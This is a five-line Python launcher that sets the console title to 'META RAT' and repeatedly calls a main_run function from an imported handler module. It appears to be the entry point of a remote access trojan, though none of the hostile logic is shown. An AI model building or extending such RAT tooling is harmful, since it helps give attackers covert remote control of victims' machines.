from module import main_handeler
import os
os.system("Title META RAT")
while True:
    main_handeler.main_run()